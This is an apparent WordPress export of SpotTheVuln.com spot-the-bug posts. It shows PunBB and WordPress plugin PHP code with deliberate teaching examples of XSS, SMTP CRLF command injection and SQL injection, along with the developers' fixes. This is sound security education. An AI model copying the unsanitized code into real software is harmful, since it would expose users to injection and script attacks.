define('FORUM_PAGE', 'login');
require FORUM_ROOT.'header.php';

// START SUBST - &lt;!-- forum_main --&gt;
ob_start();

($hook = get_hook('li_login_output_start')) ? eval($hook) : null;

?&gt;
	&lt;div class=&quot;main-head&quot;&gt;
		&lt;h2 class=&quot;hn&quot;&gt;&lt;span&gt;&lt;?php echo sprintf($lang_login['Login info'], $forum_config['o_board_title']) ?&gt;&lt;/span&gt;&lt;/h2&gt;
	&lt;/div&gt;
	&lt;div class=&quot;main-content main-frm&quot;&gt;
		&lt;div class=&quot;content-head&quot;&gt;
			&lt;p class=&quot;hn&quot;&gt;&lt;?php printf($lang_login['Login options'], '&lt;a href=&quot;'.forum_link($forum_url['register']).'&quot;&gt;'.$lang_login['register'].'&lt;/a&gt;', '&lt;a href=&quot;'.forum_link($forum_url['request_password']).'&quot;&gt;'.$lang_login['Obtain pass'].'&lt;/a&gt;') ?&gt;&lt;/p&gt;
		&lt;/div&gt;
&lt;?php

	// If there were any errors, show them
	if (!empty($errors))
	{
		$forum_page['errors'] = array();
	foreach ($errors as $cur_error)
			$forum_page['errors'][] = '&lt;li class=&quot;warn&quot;&gt;&lt;span&gt;'.$cur_error.'&lt;/span&gt;&lt;/li&gt;';

		($hook = get_hook('li_pre_login_errors')) ? eval($hook) : null;

?&gt;
		&lt;div class=&quot;ct-box error-box&quot;&gt;
			&lt;h2 class=&quot;warn hn&quot;&gt;&lt;?php echo $lang_login['Login errors'] ?&gt;&lt;/h2&gt;
			&lt;ul class=&quot;error-list&quot;&gt;
				&lt;?php echo implode(&quot;\n\t\t\t\t&quot;, $forum_page['errors']).&quot;\n&quot; ?&gt;
			&lt;/ul&gt;
		&lt;/div&gt;
&lt;?php

	}

?&gt;
		&lt;div id=&quot;req-msg&quot; class=&quot;req-warn ct-box error-box&quot;&gt;
			&lt;p class=&quot;important&quot;&gt;&lt;?php printf($lang_common['Required warn'], '&lt;em&gt;'.$lang_common['Required'].'&lt;/em&gt;') ?&gt;&lt;/p&gt;
		&lt;/div&gt;
		&lt;form id=&quot;afocus&quot; class=&quot;frm-form&quot; method=&quot;post&quot; accept-charset=&quot;utf-8&quot; action=&quot;&lt;?php echo $forum_page['form_action'] ?&gt;&quot;&gt;
			&lt;div class=&quot;hidden&quot;&gt;
				&lt;?php echo implode(&quot;\n\t\t\t\t&quot;, $forum_page['hidden_fields']).&quot;\n&quot; ?&gt;
			&lt;/div&gt;
&lt;?php ($hook = get_hook('li_login_pre_login_group')) ? eval($hook) : null; ?&gt;
			&lt;div class=&quot;frm-group group&lt;?php echo ++$forum_page['group_count'] ?&gt;&quot;&gt;
&lt;?php ($hook = get_hook('li_login_pre_username')) ? eval($hook) : null; ?&gt;
				&lt;div class=&quot;sf-set set&lt;?php echo ++$forum_page['item_count'] ?&gt;&quot;&gt;
					&lt;div class=&quot;sf-box text required&quot;&gt;
						&lt;label for=&quot;fld&lt;?php echo ++$forum_page['fld_count'] ?&gt;&quot;&gt;&lt;span&gt;&lt;?php echo $lang_login['Username'] ?&gt; &lt;em&gt;&lt;?php echo $lang_common['Required'] ?&gt;&lt;/em&gt;&lt;/span&gt;&lt;/label&gt;&lt;br /&gt;
						&lt;span class=&quot;fld-input&quot;&gt;&lt;input type=&quot;text&quot; id=&quot;fld&lt;?php echo $forum_page['fld_count'] ?&gt;&quot; name=&quot;req_username&quot; value=&quot;&lt;?php echo isset($_POST['req_username']) ? forum_htmlencode($_POST['req_username']) : '' ?&gt;&quot; size=&quot;35&quot; maxlength=&quot;25&quot; /&gt;&lt;/span&gt;
					&lt;/div&gt;
				&lt;/div&gt;
&lt;?php ($hook = get_hook('li_login_pre_pass')) ? eval($hook) : null; ?&gt;
				&lt;div class=&quot;sf-set set&lt;?php echo ++$forum_page['item_count'] ?&gt;&quot;&gt;
					&lt;div class=&quot;sf-box text required&quot;&gt;
						&lt;label for=&quot;fld&lt;?php echo ++$forum_page['fld_count'] ?&gt;&quot;&gt;&lt;span&gt;&lt;?php echo $lang_login['Password'] ?&gt; &lt;em&gt;&lt;?php echo $lang_common['Required'] ?&gt;&lt;/em&gt;&lt;/span&gt;&lt;/label&gt;&lt;br /&gt;
-						&lt;span class=&quot;fld-input&quot;&gt;&lt;input type=&quot;password&quot; id=&quot;fld&lt;?php echo $forum_page['fld_count'] ?&gt;&quot; name=&quot;req_password&quot; value=&quot;&lt;?php echo isset($_POST['req_password']) ? ($_POST['req_password']) : '' ?&gt;&quot; size=&quot;35&quot; /&gt;&lt;/span&gt;
+						&lt;span class=&quot;fld-input&quot;&gt;&lt;input type=&quot;password&quot; id=&quot;fld&lt;?php echo $forum_page['fld_count'] ?&gt;&quot; name=&quot;req_password&quot; value=&quot;&lt;?php echo isset($_POST['req_password']) ? forum_htmlencode($_POST['req_password']) : '' ?&gt;&quot; size=&quot;35&quot; /&gt;&lt;/span&gt;
					&lt;/div&gt;
				&lt;/div&gt;
&lt;?php ($hook = get_hook('li_login_pre_remember_me_checkbox')) ? eval($hook) : null; ?&gt;
				&lt;div class=&quot;sf-set set&lt;?php echo ++$forum_page['item_count'] ?&gt;&quot;&gt;
					&lt;div class=&quot;sf-box checkbox&quot;&gt;
						&lt;span class=&quot;fld-input&quot;&gt;&lt;input type=&quot;checkbox&quot; id=&quot;fld&lt;?php echo ++$forum_page['fld_count'] ?&gt;&quot; name=&quot;save_pass&quot; value=&quot;1&quot; /&gt;&lt;/span&gt;
						&lt;label for=&quot;fld&lt;?php echo $forum_page['fld_count'] ?&gt;&quot;&gt;&lt;span&gt;&lt;?php echo $lang_login['Remember me'] ?&gt;&lt;/span&gt; &lt;?php echo $lang_login['Persistent login'] ?&gt;&lt;/label&gt;
					&lt;/div&gt;
				&lt;/div&gt;
&lt;?php ($hook = get_hook('li_login_pre_group_end')) ? eval($hook) : null; ?&gt;
			&lt;/div&gt;
&lt;?php ($hook = get_hook('li_login_group_end')) ? eval($hook) : null; ?&gt;
			&lt;div class=&quot;frm-buttons&quot;&gt;
				&lt;span class=&quot;submit&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;&lt;?php echo $lang_login['Login'] ?&gt;&quot; /&gt;&lt;/span&gt;
			&lt;/div&gt;
		&lt;/form&gt;
	&lt;/div&gt;
&lt;?php

($hook = get_hook('li_end')) ? eval($hook) : null;

$tpl_temp = forum_trim(ob_get_contents());
$tpl_main = str_replace('&lt;!-- forum_main --&gt;', $tpl_temp, $tpl_main);
ob_end_clean();
// END SUBST - &lt;!-- forum_main --&gt;

require FORUM_ROOT.'footer.php';
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1273</wp:post_id>
		<wp:post_date>2011-01-07 02:24:01</wp:post_date>
		<wp:post_date_gmt>2011-01-07 09:24:01</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>banks-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="database-passwords"><![CDATA[database passwords]]></category>
		<category domain="post_tag" nicename="encode"><![CDATA[Encode]]></category>
		<category domain="post_tag" nicename="hashing-algorithm"><![CDATA[hashing algorithm]]></category>
		<category domain="post_tag" nicename="html-markup"><![CDATA[html markup]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="punbb"><![CDATA[PunBB]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/gE8o0E]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[8c3eb212f3312d0b2a602c33560ba876]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Sleep</title>
		<link>http://spotthevuln.com/2011/01/sleep/</link>
		<pubDate>Mon, 10 Jan 2011 12:00:18 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1276</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>It is a common experience that a problem difficult at night is resolved in the morning after a committee of sleep has worked on it.</strong> <br><strong> - John Steinbeck
</strong></blockquote>
<br/>
<br/>HINT: $to, $subject, and $message are tainted
[sourcecode language="php"]
&lt;?php
...snip...
function smtp_mail($to, $subject, $message, $headers = '')
{
	global $pun_config;

	$recipients = explode(',', $to);

	// Are we using port 25 or a custom port?
	if (strpos($pun_config['o_smtp_host'], ':') !== false)
		list($smtp_host, $smtp_port) = explode(':', $pun_config['o_smtp_host']);
	else
	{
		$smtp_host = $pun_config['o_smtp_host'];
		$smtp_port = 25;
	}

	if (!($socket = fsockopen($smtp_host, $smtp_port, $errno, $errstr, 15)))
		error('Could not connect to smtp host &quot;'.$pun_config['o_smtp_host'].'&quot; ('.$errno.') ('.$errstr.')', __FILE__, __LINE__);

	server_parse($socket, '220');

	if ($pun_config['o_smtp_user'] != '' &amp;&amp; $pun_config['o_smtp_pass'] != '')
	{
		fwrite($socket, 'EHLO '.$smtp_host.&quot;\r\n&quot;);
		server_parse($socket, '250');

		fwrite($socket, 'AUTH LOGIN'.&quot;\r\n&quot;);
		server_parse($socket, '334');

		fwrite($socket, base64_encode($pun_config['o_smtp_user']).&quot;\r\n&quot;);
		server_parse($socket, '334');

		fwrite($socket, base64_encode($pun_config['o_smtp_pass']).&quot;\r\n&quot;);
		server_parse($socket, '235');
	}
	else
	{
		fwrite($socket, 'HELO '.$smtp_host.&quot;\r\n&quot;);
		server_parse($socket, '250');
	}

	fwrite($socket, 'MAIL FROM: &lt;'.$pun_config['o_webmaster_email'].'&gt;'.&quot;\r\n&quot;);
	server_parse($socket, '250');

	$to_header = 'To: ';

	@reset($recipients);
	while (list(, $email) = @each($recipients))
	{
		fwrite($socket, 'RCPT TO: &lt;'.$email.'&gt;'.&quot;\r\n&quot;);
		server_parse($socket, '250');

		$to_header .= '&lt;'.$email.'&gt;, ';
	}

	fwrite($socket, 'DATA'.&quot;\r\n&quot;);
	server_parse($socket, '354');

	fwrite($socket, 'Subject: '.$subject.&quot;\r\n&quot;.$to_header.&quot;\r\n&quot;.$headers.&quot;\r\n\r\n&quot;.$message.&quot;\r\n&quot;);

	fwrite($socket, '.'.&quot;\r\n&quot;);
	server_parse($socket, '250');

	fwrite($socket, 'QUIT'.&quot;\r\n&quot;);
	fclose($socket);

	return true;
}
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1276</wp:post_id>
		<wp:post_date>2011-01-10 05:00:18</wp:post_date>
		<wp:post_date_gmt>2011-01-10 12:00:18</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>sleep</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/i0SycT]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[5644617f46ab2d1a99f59d758198fdba]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1442</wp:comment_id>
			<wp:comment_author><![CDATA[Tweets that mention Code Snippet Vulnerability Code Example «SpotTheVuln.com -- Topsy.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://topsy.com/spotthevuln.com/2011/01/sleep/?utm_source=pingback&amp;utm_campaign=L2</wp:comment_author_url>
			<wp:comment_author_IP>208.74.66.43</wp:comment_author_IP>
			<wp:comment_date>2011-01-10 08:57:00</wp:comment_date>
			<wp:comment_date_gmt>2011-01-10 15:57:00</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] This post was mentioned on Twitter by Felipe. Felipe said: RT @spotthevuln: New Post: Sleep http://bit.ly/f89t6E #secure #code #dev [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1294999127.3864";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1294675020.2218";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Sleep - SMTP Command Injection</title>
		<link>http://spotthevuln.com/2011/01/sleep-smtp-command-injection/</link>
		<pubDate>Fri, 14 Jan 2011 10:02:29 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1279</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>Details</h3>
Affected Software: PunBB

Fixed in Version: 1.3.2

Issue Type: SMTP Command Injection

Original Code: <a title="Sleep" href="https://spotthevuln.com/2011/01/sleep/" target="_blank">Found    Here</a>
<h3>Description</h3>
Interesting bug here.  In 2008, Stefan Esser reported a bug to the PunBB team which described a SMTP command injection vulnerability.  If we look at the code below, we see that PunBB opens a socket connection to a SMTP host and passes various user/attacker controlled values to the SMTP server.  Because of this setup, it is possible to craft a SMTP message that tricks the SMTP server into thinking the data provided for the message is completed, and executes any data that follows as SMTP commands.  The attacker accomplished this by injecting Carriage Return and Line Feed characters following by a period character on a line by itself (as defined in RFC 821 – SMTP).  The PunBB developers addressed this vulnerability by sanitizing CRLFs and period characters.

The Web Application Hackers Handbook (by Dafydd Stuttard) describes various forms of SMTP injection in a pretty comprehensive manner.  If the PunBB developers used the test cases described by Dafydd in his book would have likely identified this vulnerability before shipping.  Here’s a <a href="http://my.safaribooksonline.com/book/networking/security/9780470170779/a-web-application-hacker-s-methodology/stuttard0779c20-sec1-0010">sample</a> from the Web Application Hackers Handbook that talks about SMTP injection (see section 8.2)


<h3>Developers Solution</h3>
[sourcecode language="diff" highlight="9,10,11"]
&lt;?php
...snip...
function smtp_mail($to, $subject, $message, $headers = '')
{
	global $pun_config;

	$recipients = explode(',', $to);
	
+	// Sanitize the message  
+	$message = str_replace(&quot;\r\n.&quot;, &quot;\r\n..&quot;, $message);  
+	$message = (substr($message, 0, 1) == '.' ? '.'.$message : $message); 

	// Are we using port 25 or a custom port?
	if (strpos($pun_config['o_smtp_host'], ':') !== false)
		list($smtp_host, $smtp_port) = explode(':', $pun_config['o_smtp_host']);
	else
	{
		$smtp_host = $pun_config['o_smtp_host'];
		$smtp_port = 25;
	}

	if (!($socket = fsockopen($smtp_host, $smtp_port, $errno, $errstr, 15)))
		error('Could not connect to smtp host &quot;'.$pun_config['o_smtp_host'].'&quot; ('.$errno.') ('.$errstr.')', __FILE__, __LINE__);

	server_parse($socket, '220');

	if ($pun_config['o_smtp_user'] != '' &amp;&amp; $pun_config['o_smtp_pass'] != '')
	{
		fwrite($socket, 'EHLO '.$smtp_host.&quot;\r\n&quot;);
		server_parse($socket, '250');

		fwrite($socket, 'AUTH LOGIN'.&quot;\r\n&quot;);
		server_parse($socket, '334');

		fwrite($socket, base64_encode($pun_config['o_smtp_user']).&quot;\r\n&quot;);
		server_parse($socket, '334');

		fwrite($socket, base64_encode($pun_config['o_smtp_pass']).&quot;\r\n&quot;);
		server_parse($socket, '235');
	}
	else
	{
		fwrite($socket, 'HELO '.$smtp_host.&quot;\r\n&quot;);
		server_parse($socket, '250');
	}

	fwrite($socket, 'MAIL FROM: &lt;'.$pun_config['o_webmaster_email'].'&gt;'.&quot;\r\n&quot;);
	server_parse($socket, '250');

	$to_header = 'To: ';

	@reset($recipients);
	while (list(, $email) = @each($recipients))
	{
		fwrite($socket, 'RCPT TO: &lt;'.$email.'&gt;'.&quot;\r\n&quot;);
		server_parse($socket, '250');

		$to_header .= '&lt;'.$email.'&gt;, ';
	}

	fwrite($socket, 'DATA'.&quot;\r\n&quot;);
	server_parse($socket, '354');

	fwrite($socket, 'Subject: '.$subject.&quot;\r\n&quot;.$to_header.&quot;\r\n&quot;.$headers.&quot;\r\n\r\n&quot;.$message.&quot;\r\n&quot;);

	fwrite($socket, '.'.&quot;\r\n&quot;);
	server_parse($socket, '250');

	fwrite($socket, 'QUIT'.&quot;\r\n&quot;);
	fclose($socket);

	return true;
}
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1279</wp:post_id>
		<wp:post_date>2011-01-14 03:02:29</wp:post_date>
		<wp:post_date_gmt>2011-01-14 10:02:29</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>sleep-smtp-command-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="carriage-return"><![CDATA[carriage return]]></category>
		<category domain="category" nicename="crlf-injection"><![CDATA[Carriage Return/Line Feed (CRLF) Injection]]></category>
		<category domain="post_tag" nicename="encode"><![CDATA[Encode]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="punbb"><![CDATA[PunBB]]></category>
		<category domain="post_tag" nicename="rfc-821"><![CDATA[rfc 821]]></category>
		<category domain="post_tag" nicename="smtp-commands"><![CDATA[smtp commands]]></category>
		<category domain="post_tag" nicename="smtp-message"><![CDATA[smtp message]]></category>
		<category domain="post_tag" nicename="socket-connection"><![CDATA[socket connection]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/hZlXUz]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[818fc40e8ee6c7c139977e6261353369]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2123</wp:comment_id>
			<wp:comment_author><![CDATA[]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://forum.ceviz.net/php/108091-site-aciklari-hakkinda-yardimlarinizi-bekliyorum.html#post649760</wp:comment_author_url>
			<wp:comment_author_IP>89.149.254.80</wp:comment_author_IP>
			<wp:comment_date>2011-07-08 06:46:22</wp:comment_date>
			<wp:comment_date_gmt>2011-07-08 13:46:22</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...]  [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1310344291.7165";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Vegetables</title>
		<link>http://spotthevuln.com/2011/01/vegetables/</link>
		<pubDate>Mon, 17 Jan 2011 10:14:26 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1283</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>People need trouble -- a little frustration to sharpen the spirit on, toughen it. Artists do; I don't mean you need to live in a rat hole or gutter, but you have to learn fortitude, endurance. Only vegetables are happy.</strong> <br><strong> - William Faulkner
</strong>
[sourcecode language="php"]
&lt;?php
...snip...
function kd_admin_options_su(){ 
   global $table_prefix, $wpdb, $user_ID;
   
   $table_name = $table_prefix . &quot;short_url&quot;;
   
   if($wpdb-&gt;get_var(&quot;show tables like '$table_name'&quot;) != $table_name){
   
   $sql = &quot;CREATE TABLE &quot;.$table_name.&quot; (
   link_id int(11) NOT NULL auto_increment,
   link_url text NOT NULL,
   link_desc text NOT NULL,
   link_count int(11) NOT NULL default '0',
   PRIMARY KEY  (`link_id`)
   );&quot;;
   
   require_once(ABSPATH . 'wp-admin/upgrade-functions.php');
   dbDelta($sql);
   
   }


   if(isset($_POST['action'])) {
      $action = $_POST['action'];

if($action == &quot;create&quot;){
   $add_url = $_POST['form_url'];
   $add_desc = $_POST['form_desc'];
   if($add_url == &quot;http://&quot; || (!$add_url)){ $ERR = $ERR . &quot;&lt;br&gt;You must enter a URL to redirect to!&quot;; }
   if(!$ERR){
      $wpdb-&gt;query(&quot;INSERT INTO $table_name (link_url,link_desc) VALUES ('$add_url','$add_desc')&quot;);
         $new_url = get_option(&quot;siteurl&quot;) . &quot;/u/&quot; . mysql_insert_id();
         $MES = $MES . &quot;&lt;br&gt;The redirect URL has been added. Your new Short URL is: &quot; . $new_url;
         }
      }

if($action == &quot;edit&quot;){
   $edit_id = $_POST['id'];
   $edit_url = $_POST['form_url'];
   $edit_desc = $_POST['form_desc'];
   if($edit_url == &quot;http://&quot; || (!$edit_url)){ $ERR = $ERR . &quot;&lt;br&gt;You must enter a URL to redirect to!&quot;; }
   if(!$ERR){
      $wpdb-&gt;query(&quot;UPDATE $table_name SET link_url='$edit_url',link_desc='$edit_desc' WHERE link_id = $edit_id&quot;);
         $MES = $MES . &quot;&lt;br&gt;The redirect URL has been modified.&quot;;
         }
      }

   
if($action == &quot;delete&quot;){
   $delete_id = $_POST['id']; 
   $wpdb-&gt;query(&quot;DELETE FROM $table_name WHERE link_id = '$delete_id'&quot;);
   $MES = $MES . &quot;&lt;br&gt;Redirect deleted!&quot;;
   }  
   
if($action == &quot;clearall&quot;){
        $wpdb-&gt;query(&quot;UPDATE $table_name SET link_count='0' WHERE link_count &gt; 0&quot;);
   $MES = $MES . &quot;&lt;br&gt;Counts have been reset!&quot;;
   }
}
   ?&gt;
   &lt;div class=wrap&gt;
   &lt;form method=&quot;post&quot;&gt;
      &lt;h2&gt;Short URL Admin&lt;/h2&gt;
&lt;?php if($ERR){ echo &quot;&lt;p&gt;&quot; . $ERR . &quot;&lt;/p&gt;&quot;; }
if($MES){ echo &quot;&lt;p&gt;&quot; . $MES . &quot;&lt;/p&gt;&quot;; } ?&gt;
      &lt;p&gt;Short URL allows you to create shorter URL's and keeps track of how many 
times a link has been clicked. It's useful for managing downloads, keeping track
of outbound links and for masking URL's. Clicking the Clear All Clicks button
will reset the count for each entry. Visit the &lt;a href=&quot;http://www.harleyquine.com/php-scripts/short-url-plugin/&quot;&gt;plugin page&lt;/a&gt; for more information about this plugin.&lt;/p&gt;

&lt;h2&gt;Current Redirects&lt;/h2&gt;
&lt;table class=&quot;widefat&quot;&gt;
   &lt;thead&gt;
   &lt;tr&gt;
   &lt;th scope=&quot;col&quot;&gt;Short URL (The URL to use)&lt;/th&gt;
   &lt;th scope=&quot;col&quot;&gt;Real URL (Where it redirects to)&lt;/th&gt;
   &lt;th scope=&quot;col&quot;&gt;Notes&lt;/th&gt;
   &lt;th scope=&quot;col&quot;&gt;Amount of Clicks&lt;/th&gt;
   &lt;th scope=&quot;col&quot;&gt;Manage&lt;/th&gt;
   &lt;/tr&gt;
      &lt;/thead&gt;
   &lt;tbody id=&quot;the-list&quot;&gt;
&lt;?php 
   $rowdata = $wpdb-&gt;get_results(&quot;SELECT * FROM $table_name&quot;);

   foreach ($rowdata as $row) {
   $is_editing = $_POST['edit_id'];
   if($is_editing){
      if($is_editing == $row-&gt;link_id){ $EDIT = 1; $EDIT_ID = $row-&gt;link_id; $EDIT_URL = $row-&gt;link_url; $EDIT_DESC = $row-&gt;link_desc; }
      }
?&gt;
   &lt;tr class='&lt;?php echo $class; ?&gt;'&gt;

   &lt;th scope=&quot;row&quot;&gt;&lt;a href=&quot;&lt;? echo get_option(&quot;siteurl&quot;) . &quot;/u/&quot; . $row-&gt;link_id; ?&gt;&quot; target=&quot;_blank&quot;&gt;&lt;? echo get_option(&quot;siteurl&quot;) . &quot;/u/&quot; . $row-&gt;link_id; ?&gt;&lt;/a&gt;&lt;/th&gt;
   &lt;td&gt;&lt;? echo $row-&gt;link_url; ?&gt;&lt;/td&gt;
   &lt;td&gt;&lt;? echo $row-&gt;link_desc; ?&gt;&lt;/td&gt;
   &lt;td&gt;&lt;? echo $row-&gt;link_count; ?&gt;&lt;/td&gt;
   &lt;td&gt;&lt;form method=&quot;post&quot; name=&quot;delete&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;delete&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;&lt;? echo $row-&gt;link_id; ?&gt;&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Delete&quot;&gt;&lt;/form&gt;&lt;form method=&quot;post&quot; name=&quot;edit&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;edit_id&quot; value=&quot;&lt;? echo $row-&gt;link_id; ?&gt;&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Edit&quot;&gt;&lt;/form&gt;&lt;/td&gt;
...snip...
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1283</wp:post_id>
